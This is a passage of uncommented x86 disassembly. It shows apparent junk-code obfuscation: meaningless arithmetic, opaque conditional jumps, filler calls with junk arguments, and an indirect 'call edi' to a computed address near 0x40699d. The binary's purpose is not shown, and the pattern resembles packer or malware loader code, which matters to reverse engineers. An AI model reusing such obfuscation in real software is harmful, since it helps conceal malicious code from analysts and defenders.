  406012:	mov    edx,DWORD PTR ds:0x43406c
  406018:	sub    DWORD PTR [ebp-0x5c],edi
  40601b:	add    edx,edi
  40601d:	mov    DWORD PTR [ebp-0x5c],edx
  406020:	add    ebx,ecx
  406022:	mov    DWORD PTR [ebp-0x5c],esi
  406025:	sub    DWORD PTR [ebp-0x5c],eax
  406028:	sub    ebx,esi
  40602a:	sub    ebx,eax
  40602c:	sub    DWORD PTR [ebp-0x5c],ebx
  40602f:	mov    DWORD PTR [ebp-0x4c],eax
  406032:	add    edx,esi
  406034:	sub    edx,ebx
  406036:	test   edx,0xe2
  40603c:	je     0x406153
  406042:	mov    edi,DWORD PTR [ebp-0x5c]
  406045:	add    edx,ebx
  406047:	cmp    edx,ebx
  406049:	jne    0x406153
  40604f:	test   edi,0xb59b
  406055:	je     0x406153
  40605b:	mov    ebx,ecx
  40605d:	cmp    edi,DWORD PTR [ebp-0x2c]
  406060:	jne    0x406153
  406066:	mov    esi,DWORD PTR [ebp-0x5c]
  406069:	add    esi,edi
  40606b:	mov    edi,DWORD PTR ds:0x43407c
  406071:	add    DWORD PTR [ebp-0x5c],ebx
  406074:	sub    DWORD PTR [ebp-0x5c],eax
  406077:	add    edx,edx
  406079:	and    edx,ecx
  40607b:	and    edi,ecx
  40607d:	cmp    esi,DWORD PTR [ebp-0x48]
  406080:	je     0x406153
  406086:	mov    ebx,DWORD PTR [ebp-0x5c]
  406089:	add    esi,eax
  40608b:	mov    edi,edx
  40608d:	cmp    edi,0xffffffa3
  406090:	jne    0x406153
  406096:	mov    edx,DWORD PTR [ebp-0x5c]
  406099:	sub    edx,ebx
  40609b:	mov    ebx,DWORD PTR [ebp-0x5c]
  40609e:	test   edx,0x23
  4060a4:	je     0x406153
  4060aa:	cmp    edi,edx
  4060ac:	je     0x406153
  4060b2:	and    esi,eax
  4060b4:	cmp    edx,DWORD PTR [ebp-0x40]
  4060b7:	je     0x406153
  4060bd:	test   esi,0x2012faa
  4060c3:	je     0x406153
  4060c9:	cmp    ebx,ecx
  4060cb:	je     0x406153
  4060d1:	or     DWORD PTR [ebp-0x5c],esi
  4060d4:	mov    esi,0xc5
  4060d9:	cmp    edx,0x4f
  4060dc:	jne    0x406153
  4060de:	add    ebx,esi
  4060e0:	sub    DWORD PTR [ebp-0x5c],edx
  4060e3:	add    DWORD PTR [ebp-0x5c],ecx
  4060e6:	mov    esi,DWORD PTR [ebp-0x5c]
  4060e9:	cmp    edi,0xfffffffe
  4060ec:	jne    0x406153
  4060ee:	add    esi,esi
  4060f0:	sub    DWORD PTR [ebp-0x5c],ebx
  4060f3:	and    DWORD PTR [ebp-0x5c],esi
  4060f6:	add    DWORD PTR [ebp-0x5c],esi
  4060f9:	mov    ebx,0x5b
  4060fe:	mov    edx,DWORD PTR [ebp-0x5c]
  406101:	and    edi,esi
  406103:	sub    DWORD PTR [ebp-0x5c],edx
  406106:	sub    DWORD PTR [ebp-0x5c],edi
  406109:	cmp    edi,DWORD PTR [ebp-0x60]
  40610c:	jne    0x406111
  40610e:	add    DWORD PTR [ebp-0x5c],ecx
  406111:	cmp    edi,DWORD PTR [ebp-0x18]
  406114:	je     0x406153
  406116:	mov    esi,DWORD PTR [ebp-0x5c]
  406119:	mov    edi,DWORD PTR [ebp-0x5c]
  40611c:	cmp    esi,0x60
  40611f:	je     0x406153
  406121:	mov    ebx,0xd2
  406126:	and    ebx,esi
  406128:	mov    esi,DWORD PTR [ebp-0x5c]
  40612b:	add    edi,edi
  40612d:	xor    DWORD PTR [ebp-0x5c],ebx
  406130:	sub    esi,ecx
  406132:	sub    DWORD PTR [ebp-0x5c],edi
  406135:	add    esi,ebx
  406137:	sub    DWORD PTR [ebp-0x5c],edx
  40613a:	cmp    edx,eax
  40613c:	jne    0x406153
  40613e:	test   esi,0x5e
  406144:	jne    0x406153
  406146:	test   esi,0x25
  40614c:	jne    0x406153
  40614e:	and    esi,eax
  406150:	add    DWORD PTR [ebp-0x5c],esi
  406153:	and    esi,ecx
  406155:	add    DWORD PTR [ebp-0x5c],edx
  406158:	or     DWORD PTR [ebp-0x5c],eax
  40615b:	mov    edx,DWORD PTR [ebp-0x5c]
  40615e:	add    edx,ebx
  406160:	add    esi,edx
  406162:	mov    ebx,DWORD PTR [ebp-0x5c]
  406165:	add    DWORD PTR [ebp-0x5c],ebx
  406168:	add    esi,ecx
  40616a:	add    DWORD PTR [ebp-0x5c],ecx
  40616d:	add    DWORD PTR [ebp-0x5c],esi
  406170:	sub    ecx,eax
  406172:	mov    edx,esi
  406174:	add    edx,eax
  406176:	sub    edx,ebx
  406178:	mov    esi,DWORD PTR [ebp-0x5c]
  40617b:	sub    edx,edi
  40617d:	sub    edx,edi
  40617f:	test   edx,0xf2
  406185:	jne    0x406309
  40618b:	mov    ebx,0x632e
  406190:	add    esi,ecx
  406192:	mov    edi,0xa932
  406197:	sub    ebx,esi
  406199:	cmp    edx,DWORD PTR ds:0x43406c
  40619f:	je     0x406309
  4061a5:	mov    esi,ecx
  4061a7:	add    DWORD PTR [ebp-0x5c],edi
  4061aa:	mov    edi,ecx
  4061ac:	sub    DWORD PTR [ebp-0x5c],edx
  4061af:	add    edi,edx
  4061b1:	sub    DWORD PTR [ebp-0x5c],ebx
  4061b4:	or     DWORD PTR [ebp-0x5c],edi
  4061b7:	cmp    edx,esi
  4061b9:	jne    0x406309
  4061bf:	cmp    edx,ecx
  4061c1:	je     0x406309
  4061c7:	mov    esi,0x2d54832
  4061cc:	mov    edx,DWORD PTR ds:0x434088
  4061d2:	cmp    edi,DWORD PTR ds:0x434060
  4061d8:	je     0x406309
  4061de:	sub    edx,ebx
  4061e0:	xor    DWORD PTR [ebp-0x5c],edx
  4061e3:	sub    esi,ebx
  4061e5:	cmp    esi,0xfffffff7
  4061e8:	jne    0x406309
  4061ee:	mov    edx,DWORD PTR [ebp-0x5c]
  4061f1:	cmp    edx,ebx
  4061f3:	je     0x406309
  4061f9:	mov    ebx,DWORD PTR [ebp-0x5c]
  4061fc:	mov    edi,eax
  4061fe:	cmp    edx,0x33
  406201:	je     0x406309
  406207:	and    ebx,eax
  406209:	cmp    esi,0xffffffe6
  40620c:	je     0x406309
  406212:	cmp    ebx,DWORD PTR ds:0x434088
  406218:	jne    0x406309
  40621e:	xor    edi,edi
  406220:	cmp    edx,0xea5c
  406226:	jne    0x406309
  40622c:	sub    DWORD PTR [ebp-0x5c],ebx
  40622f:	mov    DWORD PTR [ebp-0x10],edi
  406232:	mov    edi,0x5e
  406237:	sub    DWORD PTR [ebp-0x5c],edx
  40623a:	and    esi,ebx
  40623c:	add    esi,eax
  40623e:	cmp    ebx,0xfffffff6
  406241:	je     0x406309
  406247:	mov    edx,DWORD PTR [ebp-0x10]
  40624a:	and    edi,esi
  40624c:	mov    esi,DWORD PTR [ebp-0x10]
  40624f:	or     edx,edi
  406251:	sub    edx,edi
  406253:	add    edx,ebx
  406255:	add    edx,ecx
  406257:	test   edx,0x2a
  40625d:	jne    0x406309
  406263:	mov    ebx,edx
  406265:	or     esi,ebx
  406267:	cmp    esi,DWORD PTR ds:0x43407c
  40626d:	je     0x406309
  406273:	mov    edx,ebx
  406275:	xor    ebx,ebx
  406277:	sub    esi,ebx
  406279:	add    edx,edx
  40627b:	sub    edx,esi
  40627d:	cmp    edx,0xffffff9f
  406280:	jne    0x406309
  406286:	cmp    edi,eax
  406288:	je     0x406309
  40628a:	mov    edi,DWORD PTR ds:0x434060
  406290:	sub    edx,ebx
  406292:	mov    ebx,0x99
  406297:	and    edx,edi
  406299:	test   edx,0xf8
  40629f:	jne    0x406309
  4062a1:	add    DWORD PTR [ebp-0x10],edx
  4062a4:	xor    edi,edi
  4062a6:	sub    edi,edx
  4062a8:	mov    esi,DWORD PTR [ebp-0x10]
  4062ab:	cmp    edi,DWORD PTR [ebp-0x48]
  4062ae:	je     0x406309
  4062b0:	cmp    esi,0x6e
  4062b3:	jne    0x406309
  4062b5:	cmp    esi,0xca246132
  4062bb:	je     0x406309
  4062bd:	mov    edx,0xbe
  4062c2:	cmp    esi,DWORD PTR ds:0x43407c
  4062c8:	jne    0x406309
  4062ca:	and    ebx,edx
  4062cc:	cmp    esi,DWORD PTR ds:0x43407c
  4062d2:	jne    0x406309
  4062d4:	mov    edx,DWORD PTR ds:0x43405c
  4062da:	cmp    esi,DWORD PTR [ebp-0x28]
  4062dd:	jne    0x406309
  4062df:	sub    edx,eax
  4062e1:	and    ebx,edi
  4062e3:	sub    edx,ecx
  4062e5:	add    DWORD PTR [ebp-0x10],edx
  4062e8:	cmp    ebx,0x51
  4062eb:	jne    0x406309
  4062ed:	mov    edi,0x19
  4062f2:	mov    edx,0xed
  4062f7:	sub    edi,eax
  4062f9:	sub    esi,edx
  4062fb:	cmp    ebx,0x29
  4062fe:	je     0x406309
  406300:	sub    DWORD PTR [ebp-0x10],esi
  406303:	sub    DWORD PTR [ebp-0x10],ebx
  406306:	add    DWORD PTR [ebp-0x5c],edi
  406309:	mov    ebx,0x50
  40630e:	mov    edx,esi
  406310:	add    DWORD PTR [ebp-0x5c],edx
  406313:	add    ebx,ecx
  406315:	sub    DWORD PTR [ebp-0x5c],edi
  406318:	add    ebx,esi
  40631a:	add    DWORD PTR [ebp-0x5c],ebx
  40631d:	add    ecx,eax
  40631f:	mov    ebx,DWORD PTR [ebp-0x5c]
  406322:	cmp    ebx,DWORD PTR [ebp-0x18]
  406325:	je     0x406336
  406327:	mov    esi,eax
  406329:	add    esi,ebx
  40632b:	cmp    esi,0xf7f3
  406331:	jne    0x406336
  406333:	sub    DWORD PTR [ebp-0x5c],esi
  406336:	mov    edi,DWORD PTR [ebp-0x5c]
  406339:	mov    DWORD PTR [ebp-0x5c],edi
  40633c:	add    DWORD PTR [ebp-0x4c],eax
  40633f:	mov    esi,eax
  406341:	mov    ebx,DWORD PTR [ebp-0x5c]
  406344:	cmp    ebx,0xffffff95
  406347:	je     0x40634c
  406349:	sub    DWORD PTR [ebp-0x5c],ebx
  40634c:	add    DWORD PTR [ebp-0x5c],edi
  40634f:	sub    DWORD PTR [ebp-0x5c],ecx
  406352:	sub    esi,eax
  406354:	sub    DWORD PTR [ebp-0x5c],esi
  406357:	sub    DWORD PTR [ebp-0x5c],edx
  40635a:	sub    ecx,eax
  40635c:	add    esi,edx
  40635e:	add    DWORD PTR [ebp-0x5c],esi
  406361:	sub    edx,ecx
  406363:	mov    edi,DWORD PTR [ebp-0x5c]
  406366:	sub    edx,ebx
  406368:	mov    esi,DWORD PTR [ebp-0x5c]
  40636b:	add    DWORD PTR [ebp-0x5c],edx
  40636e:	cmp    esi,0x521b
  406374:	jne    0x4063ce
  406376:	cmp    esi,DWORD PTR [ebp-0x68]
  406379:	jne    0x4063ce
  40637b:	mov    ebx,DWORD PTR [ebp-0x5c]
  40637e:	test   edi,0x64
  406384:	je     0x4063ce
  406386:	cmp    esi,0x5f24
  40638c:	jne    0x4063ce
  40638e:	sub    DWORD PTR [ebp-0x5c],edi
  406391:	mov    edx,DWORD PTR [ebp-0x5c]
  406394:	mov    edi,ecx
  406396:	cmp    ebx,0xffffffa2
  406399:	je     0x4063ce
  40639b:	add    esi,edi
  40639d:	mov    edi,0x5af9
  4063a2:	and    edx,ecx
  4063a4:	add    edi,eax
  4063a6:	add    esi,edi
  4063a8:	add    DWORD PTR [ebp-0x5c],esi
  4063ab:	cmp    ebx,0x53
  4063ae:	jne    0x4063ce
  4063b0:	mov    esi,DWORD PTR ds:0x43405c
  4063b6:	mov    edi,eax
  4063b8:	sub    DWORD PTR [ebp-0x5c],edx
  4063bb:	add    ebx,edi
  4063bd:	add    DWORD PTR [ebp-0x5c],ebx
  4063c0:	add    DWORD PTR [ebp-0x5c],ebx
  4063c3:	cmp    edx,0xffffffe3
  4063c6:	jne    0x4063cb
  4063c8:	add    DWORD PTR [ebp-0x5c],edi
  4063cb:	mov    DWORD PTR [ebp-0x14],esi
  4063ce:	or     ecx,eax
  4063d0:	add    DWORD PTR [ebp-0x5c],edx
  4063d3:	mov    esi,DWORD PTR [ebp-0x5c]
  4063d6:	mov    edi,DWORD PTR [ebp-0x5c]
  4063d9:	add    esi,edi
  4063db:	sub    DWORD PTR [ebp-0x5c],ecx
  4063de:	add    DWORD PTR [ebp-0x5c],esi
  4063e1:	mov    DWORD PTR [ebp-0x4c],ecx
  4063e4:	mov    esi,DWORD PTR [ebp-0x5c]
  4063e7:	add    DWORD PTR [ebp-0x5c],esi
  4063ea:	call   0x4080ed
  4063ef:	push   0x36bb7200
  4063f4:	push   0x2c
  4063f6:	call   0x408020
  4063fb:	add    esp,0x8
  4063fe:	push   0x4f
  406400:	push   0x64
  406402:	call   0x408633
  406407:	add    esp,0x8
  40640a:	push   0xffffff95
  40640c:	push   0xf852ce00
  406411:	push   0x4b
  406413:	call   0x408633
  406418:	add    esp,0xc
  40641b:	push   0x3
  40641d:	push   0xffffff8e
  40641f:	push   0xffffffbf
  406421:	call   0x408633
  406426:	add    esp,0xc
  406429:	add    DWORD PTR [ebp-0x5c],esi
  40642c:	push   0xe29f2500
  406431:	push   0x39
  406433:	push   0xffffff9e
  406435:	push   0x5c
  406437:	call   0x408020
  40643c:	add    esp,0x10
  40643f:	add    DWORD PTR [ebp-0x5c],eax
  406442:	push   0x25
  406444:	push   0xca4c3600
  406449:	call   0x408020
  40644e:	add    esp,0x8
  406451:	call   0x4080ed
  406456:	push   0xffffffbd
  406458:	push   0x44
  40645a:	call   0x4080ed
  40645f:	add    esp,0x8
  406462:	push   0x1
  406464:	push   0xffffffdc
  406466:	call   0x408020
  40646b:	add    esp,0x8
  40646e:	mov    eax,DWORD PTR [ebp-0x5c]
  406471:	push   0xffffffb9
  406473:	push   0x5e9d8e00
  406478:	push   0x3ab51b00
  40647d:	call   0x4080ed
  406482:	add    esp,0xc
  406485:	call   0x4080ed
  40648a:	call   0x408379
  40648f:	call   0x408020
  406494:	cmp    esi,0xffffffa6
  406497:	je     0x4064ae
  406499:	push   0xa8163000
  40649e:	push   0xffffffba
  4064a0:	push   0xffffffa4
  4064a2:	push   0x6f
  4064a4:	push   0xffffffed
  4064a6:	call   0x408379
  4064ab:	add    esp,0x14
  4064ae:	call   0x408020
  4064b3:	sub    ebx,eax
  4064b5:	push   0xdeda2100
  4064ba:	push   0xffffff8f
  4064bc:	call   0x4080ed
  4064c1:	add    esp,0x8
  4064c4:	push   0xffffff99
  4064c6:	push   0xffffffb1
  4064c8:	call   0x4080ed
  4064cd:	add    esp,0x8
  4064d0:	push   0x7d
  4064d2:	push   0x18725700
  4064d7:	push   0xffffffa4
  4064d9:	call   0x408020
  4064de:	add    esp,0xc
  4064e1:	mov    edi,DWORD PTR [ebp-0x5c]
  4064e4:	push   0xee8bc600
  4064e9:	push   0x9879a100
  4064ee:	push   0x26ab7f00
  4064f3:	call   0x408379
  4064f8:	add    esp,0xc
  4064fb:	mov    esi,DWORD PTR [ebp-0x5c]
  4064fe:	push   0x31
  406500:	push   0x4d
  406502:	push   0xf2efed00
  406507:	push   0xfffffff1
  406509:	push   0x4a685000
  40650e:	call   0x408633
  406513:	add    esp,0x14
  406516:	add    DWORD PTR [ebp-0x5c],edi
  406519:	add    esi,esi
  40651b:	push   0x29
  40651d:	call   0x408020
  406522:	add    esp,0x4
  406525:	push   0x6e
  406527:	push   0xffffffd4
  406529:	push   0xe84b4500
  40652e:	call   0x408633
  406533:	add    esp,0xc
  406536:	push   0x60
  406538:	call   0x4080ed
  40653d:	add    esp,0x4
  406540:	sub    DWORD PTR [ebp-0x5c],edi
  406543:	sub    esi,eax
  406545:	add    DWORD PTR [ebp-0x5c],esi
  406548:	test   eax,0x4310
  40654d:	jne    0x4066bb
  406553:	push   0x75
  406555:	push   0xe29c9100
  40655a:	call   0x408020
  40655f:	add    esp,0x8
  406562:	push   0x7c
  406564:	call   0x408379
  406569:	add    esp,0x4
  40656c:	push   0xffffffbc
  40656e:	call   0x4080ed
  406573:	add    esp,0x4
  406576:	mov    eax,DWORD PTR [ebp-0x5c]
  406579:	push   0xffffffa2
  40657b:	push   0x24
  40657d:	push   0x1efa2b00
  406582:	push   0x4abeb000
  406587:	push   0xffffffc5
  406589:	call   0x408379
  40658e:	add    esp,0x14
  406591:	push   0xfffffff5
  406593:	push   0xffffffaf
  406595:	push   0x326f1000
  40659a:	call   0x408633
  40659f:	add    esp,0xc
  4065a2:	call   0x408379
  4065a7:	mov    edx,DWORD PTR [ebp-0x5c]
  4065aa:	push   0xffffffcd
  4065ac:	push   0xeee82b00
  4065b1:	call   0x408379
  4065b6:	add    esp,0x8
  4065b9:	push   0x883e4e00
  4065be:	push   0x322acc00
  4065c3:	call   0x4080ed
  4065c8:	add    esp,0x8
  4065cb:	call   0x408633
  4065d0:	push   0x4a7ce800
  4065d5:	push   0xb2ff5b00
  4065da:	push   0xe2d55f00
  4065df:	push   0x4d
  4065e1:	push   0xc8286b00
  4065e6:	call   0x408020
  4065eb:	add    esp,0x14
  4065ee:	call   0x4080ed
  4065f3:	sub    ebx,eax
  4065f5:	call   0x408020
  4065fa:	push   0x4a589b00
  4065ff:	push   0x62
  406601:	call   0x408020
  406606:	add    esp,0x8
  406609:	add    ebx,eax
  40660b:	push   0xffffffc7
  40660d:	push   0xaae25200
  406612:	call   0x4080ed
  406617:	add    esp,0x8
  40661a:	push   0xffffffa0
  40661c:	push   0x45
  40661e:	push   0xbac6a800
  406623:	push   0x981a6c00
  406628:	call   0x408633
  40662d:	add    esp,0x10
  406630:	cmp    ebx,esi
  406632:	je     0x4066bb
  406638:	cmp    ebx,DWORD PTR ds:0x434088
  40663e:	je     0x4066bb
  406640:	push   0x28087600
  406645:	push   0x42966100
  40664a:	push   0x4c
  40664c:	push   0xffffffa0
  40664e:	call   0x408020
  406653:	add    esp,0x10
  406656:	cmp    ebx,esi
  406658:	je     0x4066bb
  40665a:	push   0x6888800
  40665f:	push   0xffffffe6
  406661:	push   0x4d
  406663:	call   0x408379
  406668:	add    esp,0xc
  40666b:	push   0xffffff99
  40666d:	push   0xea500900
  406672:	call   0x408020
  406677:	add    esp,0x8
  40667a:	call   0x408379
  40667f:	and    ebx,eax
  406681:	cmp    eax,DWORD PTR ds:0x434060
  406687:	je     0x4066bb
  406689:	push   0x68039000
  40668e:	push   0x6837b400
  406693:	push   0xa84c2500
  406698:	push   0x33
  40669a:	push   0x22f6fb00
  40669f:	call   0x408633
  4066a4:	add    esp,0x14
  4066a7:	or     ebx,edi
  4066a9:	push   0xffffff81
  4066ab:	push   0xea29a200
  4066b0:	call   0x408379
  4066b5:	add    esp,0x8
  4066b8:	add    DWORD PTR [ebp-0x5c],ebx
  4066bb:	sub    esi,eax
  4066bd:	call   0x408020
  4066c2:	push   0x41
  4066c4:	push   0x1
  4066c6:	call   0x408020
  4066cb:	add    esp,0x8
  4066ce:	mov    eax,0xc2
  4066d3:	sub    DWORD PTR [ebp-0x5c],eax
  4066d6:	push   0x69
  4066d8:	push   0xe8624700
  4066dd:	call   0x4080ed
  4066e2:	add    esp,0x8
  4066e5:	sub    DWORD PTR [ebp-0x5c],edi
  4066e8:	mov    edx,eax
  4066ea:	sub    DWORD PTR [ebp-0x5c],esi
  4066ed:	push   0xffffff8f
  4066ef:	call   0x4080ed
  4066f4:	add    esp,0x4
  4066f7:	push   0x5
  4066f9:	call   0x4080ed
  4066fe:	add    esp,0x4
  406701:	push   0xffffff9b
  406703:	push   0x84b3400
  406708:	push   0x3e94d300
  40670d:	push   0x9
  40670f:	call   0x4080ed
  406714:	add    esp,0x10
  406717:	push   0xea175800
  40671c:	call   0x408633
  406721:	add    esp,0x4
  406724:	push   0xfffffff8
  406726:	push   0xffffffc7
  406728:	push   0x38108a00
  40672d:	push   0x65
  40672f:	push   0xffffffd0
  406731:	call   0x408633
  406736:	add    esp,0x14
  406739:	push   0x3216ad00
  40673e:	push   0x26a87600
  406743:	call   0x408633
  406748:	add    esp,0x8
  40674b:	push   0xf22bb300
  406750:	push   0xffffff9b
  406752:	push   0x2e
  406754:	call   0x408020
  406759:	add    esp,0xc
  40675c:	push   0xca16d000
  406761:	push   0xb69e5600
  406766:	call   0x408633
  40676b:	add    esp,0x8
  40676e:	push   0x4ee62100
  406773:	push   0xffffffb4
  406775:	push   0x3d
  406777:	push   0xffffffe4
  406779:	call   0x4080ed
  40677e:	add    esp,0x10
  406781:	mov    esi,ebx
  406783:	sub    DWORD PTR [ebp-0x5c],esi
  406786:	push   0xffffffb9
  406788:	call   0x408379
  40678d:	add    esp,0x4
  406790:	xor    esi,esi
  406792:	call   0x408633
  406797:	push   0x4a545300
  40679c:	push   0xffffffa6
  40679e:	call   0x408020
  4067a3:	add    esp,0x8
  4067a6:	mov    eax,DWORD PTR [ebp-0x5c]
  4067a9:	push   0x70
  4067ab:	push   0x10
  4067ad:	push   0x4d
  4067af:	call   0x408379
  4067b4:	add    esp,0xc
  4067b7:	push   0xffffffa8
  4067b9:	push   0xffffffe0
  4067bb:	push   0x34
  4067bd:	push   0xffffff84
  4067bf:	call   0x408020
  4067c4:	add    esp,0x10
  4067c7:	push   0x46
  4067c9:	call   0x408379
  4067ce:	add    esp,0x4
  4067d1:	push   0xffffffa2
  4067d3:	push   0xf2932100
  4067d8:	push   0xffffff98
  4067da:	push   0xffffff8b
  4067dc:	call   0x408633
  4067e1:	add    esp,0x10
  4067e4:	push   0x186f7800
  4067e9:	push   0x323e6300
  4067ee:	push   0x4c
  4067f0:	call   0x4080ed
  4067f5:	add    esp,0xc
  4067f8:	push   0x56c9c900
  4067fd:	push   0x7ecf4000
  406802:	push   0x56
  406804:	push   0xffffff85
  406806:	call   0x408020
  40680b:	add    esp,0x10
  40680e:	or     DWORD PTR [ebp-0x5c],eax
  406811:	or     esi,eax
  406813:	sub    DWORD PTR [ebp-0x5c],esi
  406816:	sub    DWORD PTR [ebp-0x5c],edi
  406819:	push   0xfffffff9
  40681b:	push   0x16
  40681d:	push   0xea13cf00
  406822:	call   0x408379
  406827:	add    esp,0xc
  40682a:	call   0x408020
  40682f:	push   0xffffffa5
  406831:	push   0xffffffb0
  406833:	push   0xffffff98
  406835:	push   0x9a96f300
  40683a:	push   0xfffffff3
  40683c:	call   0x408379
  406841:	add    esp,0x14
  406844:	lea    ebx,[ebp-0x24]
  406847:	xor    DWORD PTR [ebp-0x5c],ebx
  40684a:	call   0x408633
  40684f:	cmp    ebx,DWORD PTR ds:0x43405c
  406855:	je     0x40686c
  406857:	test   esi,0x5c
  40685d:	je     0x40686c
  40685f:	push   0x66c2b600
  406864:	call   0x408020
  406869:	add    esp,0x4
  40686c:	push   0x720aa800
  406871:	push   0x1d
  406873:	push   0xaeae600
  406878:	call   0x408633
  40687d:	add    esp,0xc
  406880:	push   ebx
  406881:	push   0x7218df00
  406886:	call   0x4080ed
  40688b:	add    esp,0x4
  40688e:	call   0x408020
  406893:	push   0x7240ec29
  406898:	xor    ecx,ecx
  40689a:	push   0xffffffbb
  40689c:	call   0x408020
  4068a1:	add    esp,0x4
  4068a4:	sub    DWORD PTR [ebp-0x5c],eax
  4068a7:	push   0xffffffe2
  4068a9:	call   0x4080ed
  4068ae:	add    esp,0x4
  4068b1:	call   0x406e66
  4068b6:	push   0xb2310f00
  4068bb:	push   0xffffffdd
  4068bd:	push   0x5812cc00
  4068c2:	call   0x4080ed
  4068c7:	add    esp,0xc
  4068ca:	push   0xffffffd6
  4068cc:	push   0xd8420400
  4068d1:	push   0x3f
  4068d3:	push   0xffffffbe
  4068d5:	call   0x408020
  4068da:	add    esp,0x10
  4068dd:	mov    edx,DWORD PTR [ebp-0x24]
  4068e0:	mov    eax,DWORD PTR ds:0x434060
  4068e6:	mov    ebx,DWORD PTR ds:0x43407c
  4068ec:	add    DWORD PTR [ebp-0x5c],eax
  4068ef:	sub    ebx,edi
  4068f1:	cmp    ebx,0x8014004
  4068f7:	jne    0x406939
  4068f9:	sub    ebx,eax
  4068fb:	mov    ecx,DWORD PTR [ebp-0x5c]
  4068fe:	mov    esi,DWORD PTR ds:0x43405c
  406904:	and    DWORD PTR [ebp-0x5c],edi
  406907:	cmp    ecx,eax
  406909:	jne    0x406939
  40690b:	sub    ebx,edx
  40690d:	mov    edi,DWORD PTR [ebp-0x5c]
  406910:	mov    eax,DWORD PTR ds:0x434058
  406916:	sub    DWORD PTR [ebp-0x5c],ebx
  406919:	cmp    edx,0x1d
  40691c:	jne    0x406939
  40691e:	mov    ebx,0xba
  406923:	sub    DWORD PTR [ebp-0x5c],edx
  406926:	add    DWORD PTR [ebp-0x5c],ecx
  406929:	xor    DWORD PTR [ebp-0x5c],esi
  40692c:	or     edi,eax
  40692e:	add    DWORD PTR [ebp-0x5c],esi
  406931:	or     edi,esi
  406933:	sub    DWORD PTR [ebp-0x5c],ebx
  406936:	add    DWORD PTR [ebp-0x5c],edi
  406939:	shr    edx,0x10
  40693c:	sub    ebx,edi
  40693e:	add    DWORD PTR [ebp-0x5c],ebx
  406941:	cmp    edx,0xa0e7
  406947:	jne    0x406d2c
  40694d:	push   0xf2dbc900
  406952:	call   0x408633
  406957:	add    esp,0x4
  40695a:	push   0xfee57800
  40695f:	push   0xffffffc5
  406961:	call   0x4080ed
  406966:	add    esp,0x8
  406969:	mov    edi,0xa127ce45
  40696e:	push   0xbefb1800
  406973:	call   0x4080ed
  406978:	add    esp,0x4
  40697b:	push   0xb8674100
  406980:	push   0x7f
  406982:	push   0x1
  406984:	push   0x8
  406986:	push   0x6a
  406988:	call   0x408379
  40698d:	add    esp,0x14
  406990:	sub    edi,DWORD PTR [ebp-0x24]
  406993:	push   0x1f
  406995:	call   0x4080ed
  40699a:	add    esp,0x4
  40699d:	call   edi
  40699f:	add    edi,ebx
  4069a1:	cmp    edi,0x42
  4069a4:	je     0x4069a9
  4069a6:	sub    DWORD PTR [ebp-0x5c],edi
  4069a9:	mov    DWORD PTR [ebp-0x1c],eax
  4069ac:	push   0xf2d0a700
  4069b1:	push   0xfe431700
  4069b6:	push   0xae447a00
  4069bb:	push   0xffffffaa
  4069bd:	push   0xf21fdf00
  4069c2:	call   0x408020
  4069c7:	add    esp,0x14
  4069ca:	push   0x5e0bd200
  4069cf:	push   0x32877100
  4069d4:	push   0x32bd2200
  4069d9:	push   0xe588000
  4069de:	call   0x408020
  4069e3:	add    esp,0x10
  4069e6:	mov    eax,0x4076aa
  4069eb:	mov    edx,0x7b58
  4069f0:	sub    DWORD PTR [ebp-0x5c],eax
  4069f3:	mov    ebx,DWORD PTR ds:0x43405c
  4069f9:	sub    DWORD PTR [ebp-0x5c],edx
  4069fc:	or     ebx,edx
  4069fe:	sub    DWORD PTR [ebp-0x5c],edx
  406a01:	sub    edx,esi
  406a03:	add    edx,edx
  406a05:	add    edx,esi
  406a07:	add    edx,edi
  406a09:	sub    DWORD PTR [ebp-0x5c],esi
  406a0c:	sub    DWORD PTR [ebp-0x5c],edx
  406a0f:	cmp    edi,DWORD PTR ds:0x43406c
  406a15:	je     0x406ae7
  406a1b:	and    DWORD PTR [ebp-0x5c],esi
  406a1e:	and    edx,eax
  406a20:	and    DWORD PTR [ebp-0x5c],eax
  406a23:	mov    edi,DWORD PTR [ebp-0x5c]
  406a26:	mov    esi,DWORD PTR [ebp-0x5c]
  406a29:	cmp    edx,0xfffffff0
  406a2c:	jne    0x406ae7
  406a32:	add    DWORD PTR [ebp-0x5c],ebx
  406a35:	add    esi,edx
  406a37:	mov    edx,DWORD PTR [ebp-0x5c]
  406a3a:	cmp    edx,0x7aec
  406a40:	jne    0x406ae7
  406a46:	mov    ecx,DWORD PTR ds:0x43406c
  406a4c:	mov    DWORD PTR [ebp-0x5c],ecx
  406a4f:	cmp    edi,0xffffffa4
  406a52:	jne    0x406ae7
  406a58:	mov    ecx,0xc1
  406a5d:	mov    ebx,edx
  406a5f:	or     DWORD PTR [ebp-0x5c],ebx
  406a62:	add    ecx,eax
  406a64:	add    DWORD PTR [ebp-0x5c],edi
  406a67:	sub    esi,eax
  406a69:	mov    DWORD PTR [ebp-0x5c],esi
  406a6c:	add    ecx,edi
  406a6e:	cmp    ecx,0x3dbb
  406a74:	je     0x406ae7
  406a76:	mov    esi,DWORD PTR [ebp-0x5c]
  406a79:	mov    edi,DWORD PTR [ebp-0x5c]
  406a7c:	cmp    ecx,edi
  406a7e:	je     0x406ae7
  406a80:	sub    edi,ebx
  406a82:	mov    ebx,DWORD PTR [ebp-0x5c]
  406a85:	mov    edx,DWORD PTR [ebp-0x5c]
  406a88:	add    DWORD PTR [ebp-0x5c],edx
  406a8b:	cmp    ebx,DWORD PTR ds:0x434058
  406a91:	je     0x406ae7
  406a93:	cmp    edi,DWORD PTR [ebp-0x30]
  406a96:	je     0x406ae7
  406a98:	and    ecx,esi
  406a9a:	xor    edx,edx
  406a9c:	mov    esi,DWORD PTR [ebp-0x5c]
  406a9f:	sub    DWORD PTR [ebp-0x5c],esi
  406aa2:	add    DWORD PTR [ebp-0x5c],edi
  406aa5:	sub    DWORD PTR [ebp-0x5c],esi
  406aa8:	cmp    ebx,edx
  406aaa:	je     0x406ae7
  406aac:	cmp    ebx,DWORD PTR ds:0x434060
  406ab2:	jne    0x406ae7
  406ab4:	mov    edx,DWORD PTR ds:0x43404c
  406aba:	cmp    ecx,0x45
  406abd:	jne    0x406ae7
  406abf:	mov    edi,DWORD PTR [ebp-0x5c]
  406ac2:	xor    esi,esi
  406ac4:	mov    DWORD PTR [ebp-0x5c],esi
  406ac7:	cmp    edi,0xffffffaa
  406aca:	jne    0x406ae7
  406acc:	mov    esi,DWORD PTR ds:0x43405c
  406ad2:	add    DWORD PTR [ebp-0x5c],edx
  406ad5:	xor    DWORD PTR [ebp-0x5c],ebx
  406ad8:	add    esi,edi
